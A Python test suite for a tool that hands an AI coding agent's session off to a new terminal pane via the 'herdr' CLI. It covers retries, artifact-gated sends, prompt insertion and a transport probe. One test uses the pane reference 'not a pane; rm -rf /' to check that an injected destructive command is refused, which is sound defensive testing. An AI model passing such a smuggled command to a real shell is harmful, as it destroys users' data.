            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, SPLIT_OK)
            if argv[:3] == ["herdr", "agent", "start"]:
                starts["n"] += 1
                clock["t"] += 180.0     # every attempt burns the runner's whole timeout
                return FakeProc(1, '{"error":{"code":"agent_pane_busy"}}')
            return FakeProc(0, PANE_GET_OK)

        out = ll.perform_handoff(runner=runner, **_handoff(now=lambda: clock["t"]))
        assert out["failed_step"] == "agent_start"
        assert starts["n"] < ll.PANE_READY_ATTEMPTS, \
            "the retry ran its whole attempt budget — the wall clock never bounded it"


# ---------------------------------------------------------------------------
# AC6 — the condition is read VERBATIM from the predecessor's own transcript
# ---------------------------------------------------------------------------

class TestVerbatimConditionExtraction:
    def test_the_last_unmet_condition_is_returned_verbatim(self) -> None:
        assert ll.last_unmet_goal_condition(TRANSCRIPT_OK) == GOAL_CONDITION

    def test_the_LAST_unmet_row_wins_not_the_first(self) -> None:
        rows = "\n".join(json.dumps(
            {"attachment": {"type": "goal_status", "met": False, "condition": c}})
            for c in ("first goal", "second goal"))
        assert ll.last_unmet_goal_condition(rows) == "second goal"

    def test_a_met_goal_is_not_a_condition_to_re_arm(self) -> None:
        met = json.dumps({"attachment": {"type": "goal_status", "met": True,
                                         "condition": "already done"}})
        assert ll.last_unmet_goal_condition(met) is None

    def test_absent_or_unparseable_yields_none_never_a_guess(self) -> None:
        for text in ("", "garbage\n", '{"goal_status":{"met":false}}'):
            assert ll.last_unmet_goal_condition(text) is None

    def test_a_multiline_condition_survives_verbatim(self) -> None:
        cond = "line one\nline two\n  - a bullet with `backticks` and $(not expanded)"
        row = json.dumps({"attachment": {"type": "goal_status", "met": False,
                                         "condition": cond}})
        assert ll.last_unmet_goal_condition(row) == cond


# ---------------------------------------------------------------------------
# A freshly split pane is not immediately an available shell — found LIVE, 2026-07-28
# ---------------------------------------------------------------------------

# The verbatim refusal herdr 0.7.5 returns when `agent start` targets a pane whose shell has
# not come up yet. Captured from a real run against the live server during epic #667: the
# handoff split successfully, `agent start` failed instantly, and the ownership discipline
# correctly closed the tentative pane — so the whole handoff aborted on a condition that
# resolves itself in a second or two.
AGENT_PANE_BUSY = json.dumps({
    "error": {"code": "agent_pane_busy",
              "message": "agent target pane w1:pBC is not an available shell"},
    "id": "cli:agent:start"})


class BusyThenReadyRunner(Runner):
    """`herdr agent start` refuses with agent_pane_busy for the first N calls, then succeeds."""

    def __init__(self, busy_times, **kw):
        super().__init__(**kw)
        self.busy_times = busy_times
        self.start_calls = 0

    def __call__(self, argv, timeout=180):
        if self.key(argv) == "herdr agent start":
            self.calls.append(list(argv))
            self.start_calls += 1
            if self.start_calls <= self.busy_times:
                return FakeProc(returncode=1, stdout=AGENT_PANE_BUSY)
            return FakeProc(returncode=0, stdout="")
        return super().__call__(argv, timeout=timeout)


class TestSplitPaneReadiness:
    def test_agent_start_is_retried_while_the_pane_is_busy(self) -> None:
        """The pane becomes available on its own; the handoff must wait for it rather than
        abort. Before this fix a real handoff died here with the split already done."""
        r = BusyThenReadyRunner(2, responses={"herdr pane split": SPLIT_OK,
                                              "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert r.start_calls == 3, "expected two refusals then a success"

    def test_a_pane_that_never_becomes_available_still_fails_closed(self) -> None:
        """Bounded, not infinite: a genuinely broken pane must still abort — and must still
        close the tentative pane, because ownership never transferred."""
        r = BusyThenReadyRunner(10_000, responses={"herdr pane split": SPLIT_OK,
                                                   "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False
        assert out["failed_step"] == "agent_start"
        assert r.start_calls == ll.PANE_READY_ATTEMPTS
        assert out["cleanup"] == "closed tentative pane w1:pZZ"

    def test_a_non_busy_failure_is_not_retried(self) -> None:
        """Only the self-resolving condition is waited on. A different refusal — a bad name, a
        dead server — is terminal, and retrying it would just delay the abort."""
        r = Runner(responses={"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK},
                   fail_on="herdr agent start")
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "agent_start"
        assert r.kinds().count("herdr agent start") == 1

    def test_the_refusal_body_is_recorded_on_the_step(self) -> None:
        """The live failure cost a manual reproduction to diagnose because the sequence
        discarded herdr's own error payload. Keep it on the step record."""
        r = BusyThenReadyRunner(10_000, responses={"herdr pane split": SPLIT_OK,
                                                   "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        starts = [s for s in out["steps"] if s["kind"] == "agent_start"]
        assert starts, "no agent_start step recorded"
        assert any("agent_pane_busy" in (s.get("note") or "") for s in starts), \
            "herdr's error code must survive onto the step record"


# ---------------------------------------------------------------------------
# #694 — three sends, each gated on a DURABLE ARTIFACT, and `/goal` LAST
#
# The predecessor of this class gated the resume-prompt paste on `agent_status == "idle"`. It was
# falsified by live measurement before it shipped, and these tests exist so it cannot come back:
#
#   - X1: after a REAL unmet goal was armed, the pane reported `working` on consecutive reads while
#     the `goal_status met:false` row was ALREADY present. An idle gate placed after `goal_armed`
#     therefore refuses EVERY real handoff — strictly worse than the bug it was meant to fix.
#   - X2: `/goal` pasted into a session actively mid-turn produced its row while that turn was
#     still running. It needs no idle window, which is what lets it go LAST.
#   - `agent_status` is not a synchronisation signal at all: `idle` right after a prompt was
#     submitted, `done` mid-output, `working` at an empty input line.
#
# So the gates are artifacts the successor itself writes, and nothing branches on pane status.
# ---------------------------------------------------------------------------

class TestAgentStatusNeverGatesControlFlow:
    """The falsified gate, pinned shut from the other side."""

    @pytest.mark.parametrize("status", ["working", "blocked", "done", "unknown", None])
    def test_a_handoff_completes_whatever_the_pane_status_says(self, status) -> None:
        """X1 is the case that matters: a healthy successor mid-goal-turn reads `working`. Any
        branch on this value refuses a handoff that is actually fine."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": _pane_get(status)})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert out["failed_step"] is None
        assert RESUME_PROMPT in _sent(r), "the resume prompt was withheld on a pane-status reading"

    def test_no_pane_get_happens_between_the_sends(self) -> None:
        """The falsified design read `pane get` between two sends to sample readiness. The only
        legitimate `pane get` is the early one that reads the session id, before any send."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        kinds = [s["kind"] for s in out["steps"]]
        first_send = min(i for i, k in enumerate(kinds) if k.startswith("send_"))
        assert "pane_get" not in kinds[first_send:], \
            "a readiness sample crept back in between the sends"


class TestTheThreeSendsAreOrderedAndGated:
    @staticmethod
    def _send_texts(out) -> list[str]:
        """The `kind` of each send-text step, in order."""
        return [s["kind"] for s in out["steps"] if s["kind"] in
                ("send_bind", "send_resume_prompt", "send_text")]

    def test_the_bind_goes_first_the_prompt_second_and_the_goal_last(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert self._send_texts(out) == ["send_bind", "send_resume_prompt", "send_text"]

    def test_the_bind_is_its_own_send_carrying_the_project(self) -> None:
        """A bare `/rawgentic:switch` enters the switch skill's LIST MODE and waits for a human
        (#682), so the argument is the whole point of sending it at all."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is True, out
        assert _sent(r)[0] == f"/rawgentic:switch {PROJECT}"

    def test_the_prompt_is_not_sent_until_the_REGISTRY_ROW_appears(self) -> None:
        """The gate is the durable artifact, not a timer and not pane status. Without the row the
        prompt must never go out and the predecessor must survive."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=Artifacts(registry="")))
        assert out["ok"] is False and out["failed_step"] == "project_switched", out
        assert RESUME_PROMPT not in _sent(r), \
            "the resume prompt was sent to a successor that never bound"
        assert not _predecessor_closed(r)

    def test_the_goal_is_not_sent_until_the_PROMPT_has_landed(self) -> None:
        """`prompt_landed` reads the marker out of the successor's own transcript — rc 0 on
        send-text proves transport, not arrival."""
        marker = "[rawgentic-midchild:4:7]"
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            resume_prompt=f"{marker} {RESUME_PROMPT}", prompt_marker=marker,
            read_text=Artifacts(transcript="")))
        assert out["ok"] is False and out["failed_step"] == "prompt_landed", out
        assert not any(t.startswith("/goal") for t in _sent(r)), \
            "the goal was armed on a prompt that never arrived"
        assert not _predecessor_closed(r)

    def test_a_prompt_that_carries_its_own_bind_is_refused_before_anything_runs(self) -> None:
        """The exact inverse of #682's precondition, and deliberately so: the bind is SEND 1 now,
        so a prompt that also binds would make the successor run the switch skill twice. A caller
        still passing the old shape is a caller that has not been updated."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        with pytest.raises(ll.LauncherError, match="carries"):
            ll.perform_handoff(runner=r, **_handoff(resume_prompt=RESUME_PROMPT_WITH_BIND))
        assert r.calls == [], "a caller mismatch must be refused before a pane exists"

    @pytest.mark.parametrize("bad", [None, "", "not a project name!", "../escape"])
    def test_an_unusable_expected_project_is_refused_before_anything_runs(self, bad) -> None:
        """SEND 1 is built from it, so it is required rather than optional."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        with pytest.raises(ll.LauncherError, match="valid project name"):
            ll.perform_handoff(runner=r, **_handoff(expected_project=bad))
        assert r.calls == []


class TestTheLadderMatchesTheSendOrder:
    def test_the_launch_ladder_follows_the_sends(self) -> None:
        """#694 REORDERED this. `evaluate_verifications` stops at the first failure, so a ladder
        listing rungs out of send order reports the wrong step as the thing that broke."""
        assert [s["step"] for s in ll.handoff_verification_steps()] == [
            "spawned", "project_switched", "goal_armed"]

    def test_the_mid_child_ladder_follows_the_sends(self) -> None:
        """#840 prepends `queue_revalidated`: the queue must be revalidated BEFORE a successor is
        spawned to inherit it, so it cannot sit among the post-launch rungs."""
        assert [s["step"] for s in ll.mid_child_verification_steps()] == [
            "queue_revalidated", "spawned", "project_switched", "prompt_landed", "goal_armed",
            "position_rebuilt", "state_claimed"]

    def test_the_old_goal_first_ladder_is_no_longer_permitted(self) -> None:
        """A reordered ladder is refused outright, so the pre-#694 order cannot be smuggled back
        in by a caller passing `steps=`."""
        with pytest.raises(ll.LauncherError, match="non-canonical"):
            ll.evaluate_verifications(
                {"spawned": True, "goal_armed": True, "project_switched": True},
                steps=[{"step": "spawned"}, {"step": "goal_armed"},
                       {"step": "project_switched"}])



class TestParsePaneAgentStatus:
    def test_reads_a_REAL_herdr_response(self) -> None:
        assert ll.parse_pane_agent_status(PANE_GET_REAL) == "idle"
        # the same real bytes must still yield the session id the existing check relies on
        assert ll.parse_pane_agent_session(PANE_GET_REAL)

    @pytest.mark.parametrize("status", ["idle", "working", "blocked", "done", "unknown"])
    def test_round_trips_every_status_herdr_documents(self, status) -> None:
        assert ll.parse_pane_agent_status(_pane_get(status)) == status

    @pytest.mark.parametrize("bad", ["", "not json", "[]", "null", '{"result": {}}',
                                     '{"result": {"pane": {}}}',
                                     '{"result": {"pane": {"agent_status": ""}}}',
                                     '{"result": {"pane": {"agent_status": 3}}}'])
    def test_unreadable_input_is_None_never_a_guess(self, bad) -> None:
        assert ll.parse_pane_agent_status(bad) is None


class TestInsertPrompt:
    """#718 — the meter INSERTS A PROSE PROMPT at the act tier.

    Two facts were measured live on 2026-07-29 and both are pinned here, because both are the
    kind a later refactor would quietly undo:

    * A BARE SLASH COMMAND is inert. Inserted into a session with an unmet `/goal`, `/tasklist`
      sat queued through five goal-driven turns and was consumed only after the goal was
      achieved. Prose inserted the same way was acted on in 17 seconds.
    * An `Enter` sent immediately after the paste returns rc 0 and submits NOTHING. The text sat
      in the input box past goal completion until a later Enter arrived. A 1.5 s delay between
      the paste and the Enter does submit.
    """

    PROSE = ("Context is at 52% of the window. Please run the rawgentic pane-handoff skill now "
             "to pass this work to a fresh pane.")

    # ---- AC3: prose, never a bare slash command -------------------------------------------
    @pytest.mark.parametrize("prose", [
        PROSE,
        "okay, please run /rawgentic:pane-handoff",          # prose CONTAINING a command is fine
        "please run the pane-handoff skill now",
    ])
    def test_prose_is_accepted(self, prose) -> None:
        ll.validate_inserted_prompt(prose)                   # must not raise

    @pytest.mark.parametrize("bare", [
        "/rawgentic:pane-handoff",
        "/tasklist",
        "  /rawgentic:pane-handoff  ",                       # leading whitespace is still bare
        "/pane-handoff now please",                           # args do not make it prose
    ])
    def test_bare_slash_command_is_refused(self, bare) -> None:
        """AC3. A bare slash command is not a slower prompt — it is an inert one."""
        with pytest.raises(ll.LauncherError) as excinfo:
            ll.validate_inserted_prompt(bare)
        assert "slash command" in str(excinfo.value).lower()

    @pytest.mark.parametrize("empty", ["", "   ", "\n\t "])
    def test_empty_is_refused(self, empty) -> None:
        with pytest.raises(ll.LauncherError):
            ll.validate_inserted_prompt(empty)

    # ---- the delivery sequence ------------------------------------------------------------
    def test_paste_then_delay_then_enter_in_that_order(self) -> None:
        slept: list[float] = []
        runner = Runner()
        ok, reason = ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=runner,
                                      sleep=slept.append)
        assert ok, reason
        # TWO reads: one before typing, one after the delay and immediately before the Enter. The
        # second exists because the delay is a window in which a permission dialog can appear.
        assert runner.kinds() == ["herdr pane read", "herdr pane send-text",
                                  "herdr pane read", "herdr pane send-keys"]
        assert slept == [ll.INSERT_SUBMIT_DELAY_S]

    def test_a_dialog_appearing_DURING_the_delay_stops_the_enter(self) -> None:
        """The 1.5 s delay is a real window. An Enter fired into a dialog that opened inside it
        accepts the dialog instead of submitting a turn (#718 Step-11 diff review, High)."""
        reads: list[str] = []

        def runner(argv, timeout=180):
            kind = " ".join(argv[:3])
            if kind == "herdr pane read":
                reads.append(kind)
                clean = len(reads) == 1        # first read clean, second shows a dialog
                return FakeProc(0, "" if clean else "Do you want to proceed?")
            return FakeProc(0, "")

        ok, reason = ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=runner,
                                      sleep=lambda _s: None)
        assert ok is False
        assert "refusing to submit" in reason
        assert "UNSUBMITTED" in reason, "the caller must know the prose is sitting there"

    def test_the_delay_is_between_the_paste_and_the_enter(self) -> None:
        """Ordering is the whole fix: a delay BEFORE the paste would not help (#718 spike)."""
        order: list[str] = []
        runner = Runner()
        original = runner.__call__

        def recording(argv, timeout=180):
            order.append(" ".join(argv[:3]))
            return original(argv, timeout=timeout)

        ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=recording,
                         sleep=lambda _s: order.append("SLEPT"))
        assert order.index("SLEPT") > order.index("herdr pane send-text")
        assert order.index("SLEPT") < order.index("herdr pane send-keys")

    def test_a_bare_slash_never_reaches_the_terminal(self) -> None:
        runner = Runner()
        with pytest.raises(ll.LauncherError):
            ll.insert_prompt(pane="w1:pZZ", text="/rawgentic:pane-handoff", runner=runner,
                             sleep=lambda _s: None)
        assert runner.calls == [], "a refused prompt must not touch the pane at all"

    # ---- safety: an Enter accepts whatever is on screen -----------------------------------
    def test_refuses_when_a_permission_dialog_is_showing(self) -> None:
        """An Enter would ACCEPT the dialog rather than submit our text."""
        runner = Runner(responses={
            "herdr pane read": "Do you want to allow this? \n No, and tell Claude what to do"})
        ok, reason = ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=runner,
                                      sleep=lambda _s: None)
        assert ok is False
        assert "permission" in reason.lower()
        assert runner.kinds() == ["herdr pane read"], "nothing may be typed after the veto"

    def test_unreadable_pane_refuses_rather_than_typing_blind(self) -> None:
        runner = Runner(fail_on="herdr pane read")
        ok, reason = ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=runner,
                                      sleep=lambda _s: None)
        assert ok is False
        assert "read" in reason.lower()

    @pytest.mark.parametrize("failing", ["herdr pane send-text", "herdr pane send-keys"])
    def test_a_failed_herdr_call_is_reported_not_swallowed(self, failing) -> None:
        runner = Runner(fail_on=failing)
        ok, reason = ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=runner,
                                      sleep=lambda _s: None)
        assert ok is False and reason

    def test_rc_zero_is_reported_as_delivery_not_proven_submission(self) -> None:
        """#718 spike: rc 0 on send-keys is transport, not submission. Say so in the reason."""
        ok, reason = ll.insert_prompt(pane="w1:pZZ", text=self.PROSE, runner=Runner(),
                                      sleep=lambda _s: None)
        assert ok is True
        assert "submission" in reason.lower()

    def test_pane_id_is_validated(self) -> None:
        with pytest.raises(ll.LauncherError):
            ll.insert_prompt(pane="not a pane", text=self.PROSE, runner=Runner(),
                             sleep=lambda _s: None)

    # ---- the CLI -------------------------------------------------------------------------
    def test_cli_refuses_a_bare_slash_command(self) -> None:
        proc = _cli("insert-prompt", "--pane", "w1:pZZ", "--text", "/rawgentic:pane-handoff")
        assert proc.returncode != 0
        assert "slash command" in (proc.stderr + proc.stdout).lower()

    def test_cli_rejects_an_invalid_pane(self) -> None:
        proc = _cli("insert-prompt", "--pane", "not a pane", "--text", "please hand off")
        assert proc.returncode != 0


# --------------------------------------------------------- #927 transport probe

class _ProbeProc:
    """Minimal stand-in for a completed subprocess."""

    def __init__(self, returncode=0, stdout="", stderr=""):
        self.returncode = returncode
        self.stdout = stdout
        self.stderr = stderr


def _probe_pane_list(*pane_ids, agents=None):
    """A `herdr pane list` response. `agents` names which panes have an agent."""
    agents = {p: True for p in pane_ids} if agents is None else agents
    return json.dumps({"result": {"panes": [
        {"pane_id": p, "workspace_id": p.split(":")[0],
         "agent": ("claude" if agents.get(p) else None),
         "agent_status": ("working" if agents.get(p) else None)}
        for p in pane_ids]}})


def _probe_pane_get(pane_id, workspace_id=None):
    ws = workspace_id if workspace_id is not None else pane_id.split(":")[0]
    return json.dumps({"result": {"pane": {"pane_id": pane_id, "workspace_id": ws}}})


class TestTransportProbe:
    """#927: the two tiers are reported SEPARATELY, and nothing is asserted without a round trip.

    The collapse of these two into one verdict was a self-review finding on the design: campaign
    creation legitimately has no pane reference, so a single verdict would report `inline` there
    and silently re-break the default this issue exists to invert.
    """

    def test_healthy_herdr_and_a_live_pane_gives_both_tiers(self) -> None:
        def runner(argv, timeout=None):
            if argv[:3] == ["herdr", "pane", "list"]:
                return _ProbeProc(0, _probe_pane_list("w1:aaa", "w1:bbb"))
            if argv[:3] == ["herdr", "pane", "get"]:
                return _ProbeProc(0, _probe_pane_get("w1:aaa"))
            raise AssertionError(f"unexpected argv {argv}")

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert (cap, pane) == (True, True)
        assert reason == "probe_ok"

    def test_no_pane_reference_still_proves_CAPABILITY(self) -> None:
        """The creation path: no pane ref exists, but herdr is healthy.

        `capability_ok` must be True so creation can record `pane_chain`. Returning a single
        collapsed `inline` verdict here is exactly the AC-1 regression.
        """
        calls = []

        def runner(argv, timeout=None):
            calls.append(argv)
            return _ProbeProc(0, _probe_pane_list("w1:aaa"))

        cap, pane, reason = ll.transport_probe(pane_ref=None, runner=runner)
        assert cap is True
        assert pane is False
        assert reason == "no_pane_ref"
        assert all(a[:3] != ["herdr", "pane", "get"] for a in calls), (
            "tier 2 must not run without a pane reference")

    def test_unreachable_herdr_fails_both_tiers(self) -> None:
        cap, pane, reason = ll.transport_probe(
            pane_ref="w1:aaa", runner=lambda argv, timeout=None: _ProbeProc(1, ""))
        assert (cap, pane) == (False, False)
        assert reason == "herdr_unreachable"

    def test_a_missing_binary_is_not_a_crash(self) -> None:
        def runner(argv, timeout=None):
            raise FileNotFoundError("herdr")

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert (cap, pane) == (False, False)
        assert reason == "herdr_absent"

    def test_a_timeout_degrades_rather_than_raising(self) -> None:
        def runner(argv, timeout=None):
            raise subprocess.TimeoutExpired(cmd=argv, timeout=5)

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert (cap, pane) == (False, False)
        assert reason == "probe_timeout"

    def test_an_identity_mismatch_is_refused(self) -> None:
        """An rc 0 response ABOUT A DIFFERENT PANE is not evidence about this one."""
        def runner(argv, timeout=None):
            if argv[:3] == ["herdr", "pane", "list"]:
                return _ProbeProc(0, _probe_pane_list("w1:aaa"))
            return _ProbeProc(0, _probe_pane_get("w1:zzz"))

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert cap is True
        assert pane is False
        assert reason == "probe_identity_mismatch"

    def test_a_workspace_mismatch_is_refused(self) -> None:
        def runner(argv, timeout=None):
            if argv[:3] == ["herdr", "pane", "list"]:
                return _ProbeProc(0, _probe_pane_list("w1:aaa"))
            return _ProbeProc(0, _probe_pane_get("w1:aaa", workspace_id="w9"))

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert (cap, pane) == (True, False)
        assert reason == "probe_identity_mismatch"

    def test_a_pane_herdr_does_not_know_fails_tier_two_only(self) -> None:
        def runner(argv, timeout=None):
            if argv[:3] == ["herdr", "pane", "list"]:
                return _ProbeProc(0, _probe_pane_list("w1:aaa"))
            return _ProbeProc(1, "")

        cap, pane, reason = ll.transport_probe(pane_ref="w1:bbb", runner=runner)
        assert (cap, pane) == (True, False)
        assert reason == "pane_not_found"

    def test_oversized_output_is_refused_not_buffered_forever(self) -> None:
        def runner(argv, timeout=None):
            return _ProbeProc(0, "x" * (ll.PROBE_MAX_BYTES + 1))

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert (cap, pane) == (False, False)
        assert reason == "probe_oversized"

    def test_unparseable_output_degrades(self) -> None:
        cap, pane, reason = ll.transport_probe(
            pane_ref="w1:aaa", runner=lambda argv, timeout=None: _ProbeProc(0, "{not json"))
        assert (cap, pane) == (False, False)
        assert reason == "probe_unparseable"

    def test_an_invalid_pane_reference_never_reaches_herdr(self) -> None:
        """A hostile or mistyped $HERDR_PANE_ID must not be passed to a subprocess."""
        calls = []

        def runner(argv, timeout=None):
            calls.append(argv)
            return _ProbeProc(0, _probe_pane_list("w1:aaa"))

        cap, pane, reason = ll.transport_probe(pane_ref="not a pane; rm -rf /", runner=runner)
        assert cap is True
        assert pane is False
        assert reason == "invalid_pane_ref"
        assert all(a[:3] != ["herdr", "pane", "get"] for a in calls)

    def test_any_unexpected_exception_degrades_rather_than_propagating(self) -> None:
        def runner(argv, timeout=None):
            raise RuntimeError("something nobody predicted")

        cap, pane, reason = ll.transport_probe(pane_ref="w1:aaa", runner=runner)
        assert (cap, pane) == (False, False)
        assert reason.startswith("probe_error:")

    def test_the_probe_is_bounded_by_a_timeout(self) -> None:
        seen = []

        def runner(argv, timeout=None):
            seen.append(timeout)
            return _ProbeProc(0, _probe_pane_list("w1:aaa"))

        ll.transport_probe(pane_ref=None, runner=runner)
        assert seen and all(t == ll.PROBE_TIMEOUT_S for t in seen), (
            "every probe call carries the bounded timeout")
